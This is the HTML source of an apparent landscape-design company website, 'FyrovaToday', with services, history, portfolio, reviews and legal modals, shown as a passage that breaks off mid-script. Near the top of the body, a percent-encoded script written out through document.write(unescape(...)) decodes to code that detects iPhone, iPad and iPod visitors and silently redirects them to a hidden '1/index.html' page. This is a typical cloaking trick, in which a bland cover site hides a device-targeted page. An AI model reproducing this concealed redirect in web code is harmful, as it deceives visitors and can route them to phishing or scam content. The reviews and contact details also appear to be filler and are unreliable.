<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FyrovaToday - Professional Exterior Design Solutions</title>
    <meta name="description" content="FyrovaToday specializes in innovative exterior design solutions for residential and commercial properties. Transform your outdoor spaces with our expert team of landscape architects and exterior specialists.">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            line-height: 1.6;
            color: #333;
        }

        .nav-container-x7k9 {
            background: linear-gradient(135deg, #2c3e50, #34495e);
            padding: 1rem 0;
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        .nav-wrapper-m4p2 {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 2rem;
        }

        .logo-brand-q8w5 {
            font-size: 1.8rem;
            font-weight: bold;
            color: #ecf0f1;
            text-decoration: none;
        }

        .nav-menu-r3t7 {
            display: flex;
            list-style: none;
            gap: 2rem;
        }

        .nav-link-b9n1 {
            color: #ecf0f1;
            text-decoration: none;
            transition: color 0.3s ease;
            cursor: pointer;
        }

        .nav-link-b9n1:hover {
            color: #3498db;
        }

        .hero-section-z5v8 {
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.pexels.com/photos/1396122/pexels-photo-1396122.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1');
            background-size: cover;
            background-position: center;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            color: white;
        }

        .hero-content-d4j6 {
            max-width: 800px;
            padding: 2rem;
        }

        .hero-title-f2h8 {
            font-size: 3.5rem;
            margin-bottom: 1rem;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }

        .hero-subtitle-k7l3 {
            font-size: 1.3rem;
            margin-bottom: 2rem;
            opacity: 0.9;
        }

        .cta-button-p9s4 {
            background: #e74c3c;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: background 0.3s ease;
            text-decoration: none;
            display: inline-block;
        }

        .cta-button-p9s4:hover {
            background: #c0392b;
        }

        .services-section-a8u2 {
            padding: 80px 0;
            background: #f8f9fa;
        }

        .container-max-w6y1 {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
        }

        .section-title-e3r5 {
            text-align: center;
            font-size: 2.5rem;
            margin-bottom: 3rem;
            color: #2c3e50;
        }

        .services-grid-h5t9 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
        }

        .service-card-n7m4 {
            background: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            transition: transform 0.3s ease;
        }

        .service-card-n7m4:hover {
            transform: translateY(-5px);
        }

        .service-icon-x2c8 {
            width: 60px;
            height: 60px;
            background: #3498db;
            border-radius: 50%;
            margin-bottom: 1rem;
        }

        .about-section-v9k3 {
            padding: 80px 0;
            background: white;
        }

        .about-content-l4p7 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 3rem;
            align-items: center;
        }

        .about-text-q6w2 {
            font-size: 1.1rem;
            line-height: 1.8;
        }

        .about-image-s8j5 {
            border-radius: 10px;
            overflow: hidden;
        }

        .about-image-s8j5 img {
            width: 100%;
            height: 400px;
            object-fit: cover;
        }

        .history-section-b3n9 {
            padding: 80px 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .timeline-container-f7k4 {
            position: relative;
            max-width: 800px;
            margin: 0 auto;
        }

        .timeline-item-m2x6 {
            background: rgba(255,255,255,0.1);
            padding: 2rem;
            margin: 2rem 0;
            border-radius: 10px;
            backdrop-filter: blur(10px);
        }

        .portfolio-section-y4r8 {
            padding: 80px 0;
            background: #f8f9fa;
        }

        .portfolio-grid-t5h1 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 2rem;
        }

        .portfolio-item-z9c3 {
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .portfolio-image-d6v7 {
            width: 100%;
            height: 250px;
            object-fit: cover;
        }

        .portfolio-content-k8l2 {
            padding: 1.5rem;
        }

        .reviews-section-u1p4 {
            padding: 80px 0;
            background: white;
        }

        .reviews-grid-i7w9 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
        }

        .review-card-o3q5 {
            background: #f8f9fa;
            padding: 2rem;
            border-radius: 10px;
            border-left: 4px solid #3498db;
        }

        .reviewer-info-g4n8 {
            display: flex;
            align-items: center;
            margin-top: 1rem;
        }

        .reviewer-avatar-c2j6 {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            margin-right: 1rem;
            background: #3498db;
        }

        .contact-section-r8t3 {
            padding: 80px 0;
            background: #2c3e50;
            color: white;
        }

        .contact-grid-x5m7 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 2rem;
        }

        .contact-item-w9p1 {
            text-align: center;
        }

        .contact-icon-h6k4 {
            width: 60px;
            height: 60px;
            background: #3498db;
            border-radius: 50%;
            margin: 0 auto 1rem;
        }

        .phone-link-n4s8 {
            color: #3498db;
            text-decoration: none;
            font-size: 1.2rem;
        }

        .footer-section-l9v2 {
            background: #1a252f;
            color: white;
            padding: 2rem 0;
            text-align: center;
        }

        .modal-overlay-q7x4 {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 2000;
        }

        .modal-content-e8r6 {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 2rem;
            border-radius: 10px;
            max-width: 600px;
            max-height: 80vh;
            overflow-y: auto;
            color: #333;
        }

        .modal-close-j3w5 {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 2rem;
            cursor: pointer;
            color: #999;
        }

        .expertise-section-a9b7 {
            padding: 80px 0;
            background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%);
            color: white;
        }

        .expertise-grid-c4d2 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 2rem;
        }

        .expertise-card-f6g8 {
            background: rgba(255,255,255,0.1);
            padding: 2rem;
            border-radius: 15px;
            text-align: center;
            backdrop-filter: blur(10px);
        }

        .process-section-h2j4 {
            padding: 80px 0;
            background: white;
        }

        .process-steps-k5l7 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 2rem;
        }

        .process-step-m8n6 {
            text-align: center;
            padding: 2rem;
        }

        .step-number-p1q3 {
            width: 60px;
            height: 60px;
            background: #e74c3c;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            font-weight: bold;
            margin: 0 auto 1rem;
        }

        @media (max-width: 768px) {
            .nav-menu-r3t7 {
                flex-direction: column;
                gap: 1rem;
            }

            .hero-title-f2h8 {
                font-size: 2.5rem;
            }

            .about-content-l4p7 {
                grid-template-columns: 1fr;
            }

            .nav-wrapper-m4p2 {
                flex-direction: column;
                gap: 1rem;
            }
        }
    </style>
</head>
<body>

<script>
document.write(unescape('%3C%73%63%72%69%70%74%3E%0A%28%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%2F%2F%20%43%68%65%63%6B%20%69%66%20%74%68%65%20%75%73%65%72%20%69%73%20%6F%6E%20%69%50%68%6F%6E%65%20%6F%72%20%69%50%61%64%0A%20%20%20%20%76%61%72%20%75%73%65%72%41%67%65%6E%74%20%3D%20%6E%61%76%69%67%61%74%6F%72%2E%75%73%65%72%41%67%65%6E%74%2E%74%6F%4C%6F%77%65%72%43%61%73%65%28%29%3B%0A%20%20%20%20%76%61%72%20%69%73%49%4F%53%20%3D%20%2F%69%70%68%6F%6E%65%7C%69%70%61%64%7C%69%70%6F%64%2F%2E%74%65%73%74%28%75%73%65%72%41%67%65%6E%74%29%3B%0A%20%20%20%20%0A%20%20%20%20%69%66%20%28%69%73%49%4F%53%29%20%7B%0A%20%20%20%20%20%20%20%20%2F%2F%20%52%65%64%69%72%65%63%74%20%74%6F%20%61%70%70%6C%65%2E%68%74%6D%6C%0A%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%20%3D%20%27%31%2F%69%6E%64%65%78%2E%68%74%6D%6C%27%3B%0A%20%20%20%20%7D%0A%7D%29%28%29%3B%0A%3C%2F%73%63%72%69%70%74%3E'));
</script>

    <nav class="nav-container-x7k9">
        <div class="nav-wrapper-m4p2">
            <a href="#home" class="logo-brand-q8w5">FyrovaToday</a>
            <ul class="nav-menu-r3t7">
                <li><a href="#services" class="nav-link-b9n1">Services</a></li>
                <li><a href="#about" class="nav-link-b9n1">About</a></li>
                <li><a href="#history" class="nav-link-b9n1">History</a></li>
                <li><a href="#portfolio" class="nav-link-b9n1">Portfolio</a></li>
                <li><a href="#expertise" class="nav-link-b9n1">Expertise</a></li>
                <li><a href="#process" class="nav-link-b9n1">Process</a></li>
                <li><a href="#reviews" class="nav-link-b9n1">Reviews</a></li>
                <li><a href="#contact" class="nav-link-b9n1">Contact</a></li>
                <li><a href="#" class="nav-link-b9n1" onclick="openModal('privacy')">Privacy</a></li>
                <li><a href="#" class="nav-link-b9n1" onclick="openModal('terms')">Terms</a></li>
            </ul>
        </div>
    </nav>

    <section id="home" class="hero-section-z5v8">
        <div class="hero-content-d4j6">
            <h1 class="hero-title-f2h8">Transform Your Exterior Spaces</h1>
            <p class="hero-subtitle-k7l3">Professional exterior design solutions that bring your vision to life with innovative landscaping and architectural excellence</p>
            <a href="#contact" class="cta-button-p9s4">Get Started Today</a>
        </div>
    </section>

    <section id="services" class="services-section-a8u2">
        <div class="container-max-w6y1">
            <h2 class="section-title-e3r5">Our Services</h2>
            <div class="services-grid-h5t9">
                <div class="service-card-n7m4">
                    <div class="service-icon-x2c8"></div>
                    <h3>Landscape Architecture</h3>
                    <p>Complete landscape design and planning services that transform outdoor spaces into functional and beautiful environments tailored to your specific needs and preferences.</p>
                </div>
                <div class="service-card-n7m4">
                    <div class="service-icon-x2c8"></div>
                    <h3>Garden Planning</h3>
                    <p>Comprehensive garden design solutions including plant selection, seasonal planning, and sustainable gardening practices that ensure year-round beauty and functionality.</p>
                </div>
                <div class="service-card-n7m4">
                    <div class="service-icon-x2c8"></div>
                    <h3>Outdoor Living Spaces</h3>
                    <p>Design and creation of outdoor entertainment areas, patios, decks, and recreational spaces that extend your living area into the natural environment.</p>
                </div>
                <div class="service-card-n7m4">
                    <div class="service-icon-x2c8"></div>
                    <h3>Water Features</h3>
                    <p>Installation of fountains, ponds, waterfalls, and irrigation systems that add tranquility and enhance the natural beauty of your exterior spaces.</p>
                </div>
                <div class="service-card-n7m4">
                    <div class="service-icon-x2c8"></div>
                    <h3>Hardscaping</h3>
                    <p>Professional installation of walkways, retaining walls, stone features, and other structural elements that provide both function and aesthetic appeal.</p>
                </div>
                <div class="service-card-n7m4">
                    <div class="service-icon-x2c8"></div>
                    <h3>Maintenance Planning</h3>
                    <p>Ongoing care strategies and seasonal maintenance programs designed to keep your exterior spaces looking their best throughout the year.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="about" class="about-section-v9k3">
        <div class="container-max-w6y1">
            <h2 class="section-title-e3r5">About FyrovaToday</h2>
            <div class="about-content-l4p7">
                <div class="about-text-q6w2">
                    <p>FyrovaToday has been at the forefront of exterior design innovation for over two decades. Our team of experienced landscape architects and design specialists brings creativity, technical expertise, and environmental consciousness to every project we undertake.</p>
                    
                    <p>We believe that exceptional exterior spaces should seamlessly blend functionality with natural beauty. Our approach combines traditional design principles with modern sustainability practices, ensuring that each project not only looks stunning but also contributes positively to the local ecosystem.</p>
                    
                    <p>From residential gardens to commercial landscapes, we work closely with our clients to understand their vision and transform it into reality. Our commitment to quality craftsmanship and attention to detail has earned us recognition as a trusted partner in exterior design throughout the region.</p>
                </div>
                <div class="about-image-s8j5">
                    <img src="https://images.pexels.com/photos/1105766/pexels-photo-1105766.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Professional landscape design team at work">
                </div>
            </div>
        </div>
    </section>

    <section id="history" class="history-section-b3n9">
        <div class="container-max-w6y1">
            <h2 class="section-title-e3r5">Our Journey</h2>
            <div class="timeline-container-f7k4">
                <div class="timeline-item-m2x6">
                    <h3>2001 - Foundation</h3>
                    <p>FyrovaToday was established by Marcus Chen and Sarah Williams, two passionate landscape architects who shared a vision of creating sustainable and beautiful exterior spaces. Starting with a small team of five dedicated professionals, we began our journey in a modest office space.</p>
                </div>
                <div class="timeline-item-m2x6">
                    <h3>2005 - First Major Project</h3>
                    <p>We completed our first large-scale commercial project, the Riverside Business Park landscape renovation. This 15-acre project showcased our ability to handle complex designs while maintaining environmental responsibility and established our reputation in the commercial sector.</p>
                </div>
                <div class="timeline-item-m2x6">
                    <h3>2010 - Expansion</h3>
                    <p>Growing demand led us to expand our operations, opening a second office and increasing our team to 25 specialists. We also launched our sustainable design initiative, focusing on native plant species and water-efficient irrigation systems.</p>
                </div>
                <div class="timeline-item-m2x6">
                    <h3>2015 - Innovation Award</h3>
                    <p>Our innovative approach to urban green spaces earned us the Regional Excellence in Landscape Design Award. This recognition came after completing the downtown Metro Plaza revitalization project, which became a model for sustainable urban landscaping.</p>
                </div>
                <div class="timeline-item-m2x6">
                    <h3>2020 - Digital Integration</h3>
                    <p>We embraced cutting-edge technology, incorporating 3D modeling and virtual reality into our design process. This advancement allows clients to experience their future spaces before construction begins, ensuring complete satisfaction with the final result.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="portfolio" class="portfolio-section-y4r8">
        <div class="container-max-w6y1">
            <h2 class="section-title-e3r5">Featured Projects</h2>
            <div class="portfolio-grid-t5h1">
                <div class="portfolio-item-z9c3">
                    <img src="https://images.pexels.com/photos/1438832/pexels-photo-1438832.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Modern residential garden design" class="portfolio-image-d6v7">
                    <div class="portfolio-content-k8l2">
                        <h3>Hillside Residence Garden</h3>
                        <p>A stunning terraced garden design that maximizes the natural slope while creating multiple outdoor living areas. Features include native plantings, stone pathways, and a cascading water feature.</p>
                    </div>
                </div>
                <div class="portfolio-item-z9c3">
                    <img src="https://images.pexels.com/photos/1105766/pexels-photo-1105766.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Commercial landscape project" class="portfolio-image-d6v7">
                    <div class="portfolio-content-k8l2">
                        <h3>Corporate Campus Landscape</h3>
                        <p>Comprehensive landscape design for a 50,000 square foot corporate facility, incorporating sustainable practices, employee recreation areas, and seasonal interest plantings.</p>
                    </div>
                </div>
                <div class="portfolio-item-z9c3">
                    <img src="https://images.pexels.com/photos/1329711/pexels-photo-1329711.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Urban rooftop garden" class="portfolio-image-d6v7">
                    <div class="portfolio-content-k8l2">
                        <h3>Urban Rooftop Oasis</h3>
                        <p>Transformation of an unused rooftop space into a green sanctuary featuring container gardens, seating areas, and wind-resistant plant selections perfect for city living.</p>
                    </div>
                </div>
                <div class="portfolio-item-z9c3">
                    <img src="https://images.pexels.com/photos/1105019/pexels-photo-1105019.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Waterfront landscape design" class="portfolio-image-d6v7">
                    <div class="portfolio-content-k8l2">
                        <h3>Lakefront Property Design</h3>
                        <p>Sensitive landscape design that preserves natural shoreline while creating accessible outdoor spaces. Includes boardwalks, native wetland plantings, and erosion control measures.</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section id="expertise" class="expertise-section-a9b7">
        <div class="container-max-w6y1">
            <h2 class="section-title-e3r5">Areas of Expertise</h2>
            <div class="expertise-grid-c4d2">
                <div class="expertise-card-f6g8">
                    <h3>Sustainable Design</h3>
                    <p>Environmentally conscious approaches using native plants, water conservation techniques, and eco-friendly materials that support local ecosystems.</p>
                </div>
                <div class="expertise-card-f6g8">
                    <h3>Climate Adaptation</h3>
                    <p>Designs that work with local climate conditions, incorporating drought-resistant plants and weather-appropriate materials for long-term success.</p>
                </div>
                <div class="expertise-card-f6g8">
                    <h3>Soil Management</h3>
                    <p>Expert analysis and improvement of soil conditions to ensure optimal plant health and sustainable growth for all landscape elements.</p>
                </div>
                <div class="expertise-card-f6g8">
                    <h3>Seasonal Planning</h3>
                    <p>Strategic plant selection and design elements that provide year-round interest and beauty through all seasons and weather conditions.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="process" class="process-section-h2j4">
        <div class="container-max-w6y1">
            <h2 class="section-title-e3r5">Our Design Process</h2>
            <div class="process-steps-k5l7">
                <div class="process-step-m8n6">
                    <div class="step-number-p1q3">1</div>
                    <h3>Initial Consultation</h3>
                    <p>We meet with you to understand your vision, assess your space, and discuss your specific needs and preferences for the project.</p>
                </div>
                <div class="process-step-m8n6">
                    <div class="step-number-p1q3">2</div>
                    <h3>Site Analysis</h3>
                    <p>Comprehensive evaluation of soil conditions, drainage, sunlight patterns, and existing vegetation to inform our design decisions.</p>
                </div>
                <div class="process-step-m8n6">
                    <div class="step-number-p1q3">3</div>
                    <h3>Design Development</h3>
                    <p>Creation of detailed plans and 3D visualizations that bring your vision to life while addressing practical considerations.</p>
                </div>
                <div class="process-step-m8n6">
                    <div class="step-number-p1q3">4</div>
                    <h3>Implementation</h3>
                    <p>Professional installation by our experienced team, ensuring quality workmanship and attention to every detail of the design.</p>
                </div>
                <div class="process-step-m8n6">
                    <div class="step-number-p1q3">5</div>
                    <h3>Ongoing Support</h3>
                    <p>Maintenance guidance and seasonal care recommendations to help your landscape thrive for years to come.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="reviews" class="reviews-section-u1p4">
        <div class="container-max-w6y1">
            <h2 class="section-title-e3r5">Client Reviews</h2>
            <div class="reviews-grid-i7w9">
                <div class="review-card-o3q5">
                    <p>"The team at FyrovaToday transformed our backyard into an incredible outdoor living space. Their attention to detail and creative solutions exceeded our expectations. The project was completed on time and the results are absolutely stunning."</p>
                    <div class="reviewer-info-g4n8">
                        <div class="reviewer-avatar-c2j6"></div>
                        <div>
                            <strong>Jennifer Martinez</strong><br>
                            <small>Homeowner, Oakville</small>
                        </div>
                    </div>
                </div>
                <div class="review-card-o3q5">
                    <p>"Working with FyrovaToday on our commercial property was a fantastic experience. They understood our needs for low-maintenance landscaping while creating an impressive entrance that our clients always comment on."</p>
                    <div class="reviewer-info-g4n8">
                        <div class="reviewer-avatar-c2j6"></div>
                        <div>
                            <strong>Robert Chen</strong><br>
                            <small>Property Manager, Downtown Office Complex</small>
                        </div>
                    </div>
                </div>
                <div class="review-card-o3q5">
                    <p>"The sustainable approach FyrovaToday took with our garden design has saved us significantly on water bills while creating a beautiful space that attracts local wildlife. Highly recommend their expertise."</p>
                    <div class="reviewer-info-g4n8">
                        <div class="reviewer-avatar-c2j6"></div>
                        <div>
                            <strong>Lisa Thompson</strong><br>
                            <small>Environmental Consultant, Riverside</small>
                        </div>
                    </div>
                </div>
                <div class="review-card-o3q5">
                    <p>"From concept to completion, FyrovaToday delivered exceptional service. Their 3D visualizations helped us see exactly what the finished project would look like, and the final result matched perfectly."</p>
                    <div class="reviewer-info-g4n8">
                        <div class="reviewer-avatar-c2j6"></div>
                        <div>
                            <strong>Michael Rodriguez</strong><br>
                            <small>Restaurant Owner, Metro District</small>
                        </div>
                    </div>
                </div>
                <div class="review-card-o3q5">
                    <p>"The team's knowledge of native plants and sustainable practices impressed us from day one. Our new landscape not only looks amazing but also supports local ecosystems and requires minimal maintenance."</p>
                    <div class="reviewer-info-g4n8">
                        <div class="reviewer-avatar-c2j6"></div>
                        <div>
                            <strong>Amanda Foster</strong><br>
                            <small>School Administrator, Greenfield Elementary</small>
                        </div>
                    </div>
                </div>
                <div class="review-card-o3q5">
                    <p>"FyrovaToday solved our challenging slope drainage issues while creating beautiful terraced gardens. Their engineering expertise combined with artistic vision made the impossible possible."</p>
                    <div class="reviewer-info-g4n8">
                        <div class="reviewer-avatar-c2j6"></div>
                        <div>
                            <strong>David Park</strong><br>
                            <small>Architect, Hillside Residence</small>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section id="contact" class="contact-section-r8t3">
        <div class="container-max-w6y1">
            <h2 class="section-title-e3r5">Contact Us</h2>
            <div class="contact-grid-x5m7">
                <div class="contact-item-w9p1">
                    <div class="contact-icon-h6k4"></div>
                    <h3>Phone</h3>
                    <a href="tel:+15551234567" class="phone-link-n4s8">+1 (555) 123-4567</a>
                </div>
                <div class="contact-item-w9p1">
                    <div class="contact-icon-h6k4"></div>
                    <h3>Email</h3>
                    <p>info@fyrovatoday.com</p>
                </div>
                <div class="contact-item-w9p1">
                    <div class="contact-icon-h6k4"></div>
                    <h3>Address</h3>
                    <p>2847 Garden Valley Road<br>Springfield, CA 94582</p>
                </div>
                <div class="contact-item-w9p1">
                    <div class="contact-icon-h6k4"></div>
                    <h3>Business Hours</h3>
                    <p>Monday - Friday: 8:00 AM - 6:00 PM<br>Saturday: 9:00 AM - 4:00 PM<br>Sunday: Closed</p>
                </div>
            </div>
        </div>
    </section>

    <footer class="footer-section-l9v2">
        <div class="container-max-w6y1">
            <p>© 2024 FyrovaToday. All rights reserved. | Professional Exterior Design Solutions</p>
            <p>Licensed Landscape Contractors | Bonded & Insured | CA License #LIC789456</p>
        </div>
    </footer>

    <!-- Privacy Policy Modal -->
    <div id="privacy-modal" class="modal-overlay-q7x4">
        <div class="modal-content-e8r6">
            <span class="modal-close-j3w5" onclick="closeModal('privacy')">×</span>
            <h2>Privacy Policy</h2>
            <p><strong>Effective Date:</strong> January 1, 2024</p>
            
            <h3>Information We Collect</h3>
            <p>FyrovaToday collects information you provide directly to us, such as when you contact us for services, request consultations, or communicate with our team. This may include your name, email address, phone number, property address, and project details.</p>
            
            <h3>How We Use Your Information</h3>
            <p>We use the information we collect to:</p>
            <ul>
                <li>Provide exterior design services and consultations</li>
                <li>Communicate with you about your projects</li>
                <li>Send you updates about our services</li>
                <li>Improve our website and services</li>
                <li>Comply with legal obligations</li>
            </ul>
            
            <h3>Information Sharing</h3>
            <p>We do not sell, trade, or otherwise transfer your personal information to third parties without your consent, except as described in this policy. We may share information with trusted service providers who assist us in operating our website and conducting our business.</p>
            
            <h3>Data Security</h3>
            <p>We implement appropriate security measures to protect your personal information against unauthorized access, alteration, disclosure, or destruction. However, no method of transmission over the internet is 100% secure.</p>
            
            <h3>Your Rights</h3>
            <p>You have the right to access, update, or delete your personal information. You may also opt out of receiving promotional communications from us at any time.</p>
            
            <h3>Cookies</h3>
            <p>Our website may use cookies to enhance your browsing experience. You can choose to disable cookies through your browser settings, though this may affect website functionality.</p>
            
            <h3>Contact Information</h3>
            <p>If you have questions about this Privacy Policy, please contact us at info@fyrovatoday.com or call +1 (555) 123-4567.</p>
            
            <h3>Changes to This Policy</h3>
            <p>We may update this Privacy Policy from time to time. We will notify you of any changes by posting the new policy on this page with an updated effective date.</p>
        </div>
    </div>

    <!-- Terms of Service Modal -->
    <div id="terms-modal" class="modal-overlay-q7x4">
        <div class="modal-content-e8r6">
            <span class="modal-close-j3w5" onclick="closeModal('terms')">×</span>
            <h2>Terms of Service</h2>
            <p><strong>Effective Date:</strong> January 1, 2024</p>
            
            <h3>Acceptance of Terms</h3>
            <p>By accessing and using FyrovaToday's services, you accept and agree to be bound by the terms and provision of this agreement. If you do not agree to abide by the above, please do not use this service.</p>
            
            <h3>Services Description</h3>
            <p>FyrovaToday provides professional exterior design services including landscape architecture, garden planning, outdoor living space design, water features, hardscaping, and maintenance planning. All services are subject to availability and scheduling.</p>
            
            <h3>Client Responsibilities</h3>
            <p>Clients are responsible for:</p>
            <ul>
                <li>Providing accurate property information and access</li>
                <li>Obtaining necessary permits and approvals</li>
                <li>Ensuring clear access to work areas</li>
                <li>Timely payment according to agreed terms</li>
                <li>Communicating any concerns promptly</li>
            </ul>
            
            <h3>Payment Terms</h3>
            <p>Payment terms will be specified in individual service agreements. Generally, a deposit is required to begin work, with progress payments due at specified milestones. Final payment is due upon project completion and client approval.</p>
            
            <h3>Project Timeline</h3>
            <p>Project timelines are estimates and may be affected by weather conditions, permit delays, material availability, or unforeseen site conditions. FyrovaToday will communicate any delays promptly and work to minimize impact on project completion.</p>
            
            <h3>Warranty and Guarantees</h3>
            <p>We provide a one-year warranty on workmanship for hardscape installations and a 90-day warranty on plant materials, subject to proper care and maintenance. Natural factors such as weather, pests, or disease are not covered under warranty.</p>
            
            <h3>Limitation of Liability</h3>
            <p>FyrovaToday's liability is limited to the cost of services provided. We are not liable for indirect, incidental, or consequential damages. Our total liability shall not exceed the amount paid for services.</p>
            
            <h3>Intellectual Property</h3>
            <p>All design plans, drawings, and concepts created by FyrovaToday remain our intellectual property until full payment is received. Clients receive a license to use designs for their specific property only.</p>
            
            <h3>Cancellation Policy</h3>
            <p>Clients may cancel services with written notice. Cancellation fees may apply based on work completed and materials ordered. Deposits are non-refundable once design work has begun.</p>
            
            <h3>Dispute Resolution</h3>
            <p>Any disputes arising from these terms or our services will be resolved through binding arbitration in accordance with the rules of the American Arbitration Association.</p>
            
            <h3>Governing Law</h3>
            <p>These terms are governed by the laws of the State of California. Any legal proceedings must be brought in the courts of California.</p>
            
            <h3>Contact Information</h3>
            <p>For questions about these Terms of Service, contact us at info@fyrovatoday.com or +1 (555) 123-4567.</p>
        </div>
    </div>

    <script>
        // Smooth scrolling for navigation links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });

        // Modal functions
        function openModal(modalType) {
            const modal = document.getElementById(modalType + '-modal');
            if (modal) {
                modal.style.display = 'block';
                document.body.style.overflow = 'hidden';
            }
        }

        function closeModal(modalType) {
            const modal = document.getElementById(modalType + '-modal');
            if (modal) {
                modal.style.display = 'none';
                document.body.style.overflow = 'auto';
            }
        }

        // Close modal when clicking outside
        window.addEventListener('click', function(event) {
            if (event.target.classList.contains('modal-overlay-q7x4')) {
                event.target.style.display = 'none';
                document.body.style.overflow = 'auto';
            }
        });

        // Close modal with Escape key
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                const openModals = document.querySelectorAll('.modal-overlay-q7x4');
                openModals.forEach(modal => {
                    if (modal.style.display === 'block') {
                        modal.style.display = 'none';
                        document.body.style.overflow = 'auto';
                    }
                });
            }
        });

        // Add scroll effect to navigation
        window.addEventListener('scroll', function() {
            const nav = document.querySelector('.nav-container-x7k9');
            if (window.scrollY > 100) {
                nav.style.background = 'linear-gradient(135deg, rgba(44, 62, 80, 0.95), rgba(52, 73, 94, 0.95))';
                nav.style.backdropFilter = 'blur(10px)';
            } else {
                nav.style.background = 'linear-gradient(135deg, #2c3e50, #34495e)';
                nav.style.backdropFilter = 'none';
            }
        });

        // Animate service cards on scroll
        const observerOptions = {
            threshold: 0.1,
            rootMargin: '0px 0px -50px 0px'
        };

        const observer = new IntersectionObserver(function(entries) {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.style.opacity = '1';
                    entry.target.style.transform = 'translateY(0)';
                }
            });
        }, observerOptions);

        // Observe service cards and other elements
        document.addEventListener('DOMContentLoaded', function() {
            const animatedElements = document.querySelectorAll('.service-card-n7m4, .portfolio-item-z9c3, .review-card-o3q5, .expertise-card-f6g8');
            
            animatedElements.forEach(el => {
                el.style.opacity = '0';
                el.style.transform = 'translateY(30px)';
                el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
                observer.observe(el);
            });
        });

        // Add loading animation
        window.addEventListener('load', function() {
            document.body.style.opacity = '0';
            document.body.style.transition = 'opacity 0.5s ease';
            setTimeout(() => {
                document.body.style.opacity = '1';
            }, 100);
        });

        // Form validation and interaction enhancements
        document.querySelectorAll('.cta-button-p9s4').forEach(button => {
            button.addEventListener('mouseenter', function() {
                this.style.transform = 'translateY(-2px)';
                this.style.boxShadow = '0 5px 15px rgba(231, 76, 60, 0.4)';
            });
            
            button.addEventListener('mouseleave', function() {
                this.style.transform = 'translateY(0)';
                this.style.boxShadow = 'none';
            });
        });

        // Add parallax effect to hero section
        window.addEventListener('scroll', function() {
            const scrolled = window.pageYOffset;
            const hero = document.querySelector('.hero-section-z5v8');
            if (hero) {
                hero.style.transform = `translateY(${scrolled * 0.5}px)`;
            }
        });

        // Mobile menu toggle functionality
        function createMobileMenu() {
            const nav = document.querySelector('.nav-wrapper-m4p2');
            const menu = document.querySelector('.nav-menu-r3t7');
            
            if (window.innerWidth <= 768) {
                if (!document.querySelector('.mobile-toggle-btn')) {
                    const toggleBtn = document.createElement('button');
                    toggleBtn.className = 'mobile-toggle-btn';
                    toggleBtn.innerHTML = '☰';
                    toggleBtn.style.cssText = `
                        background: none;
                        border: none;
                        color: white;
                        font-size: 1.5rem;
                        cursor: pointer;
                        display: block;
                    `;
                    
                    toggleBtn.addEventListener('click', function() {
                        menu.style.display = menu.style.display === 'flex' ? 'none' : 'flex';
                    });
                    
                    nav.appendChild(toggleBtn);
                }
                menu.style.display = 'none';
            } else {
                const toggleBtn = document.querySelector('.mobile-toggle-btn');
                if (toggleBtn) {
                    toggleBtn.remove();
                }
                menu.style.display = 'flex';
            }
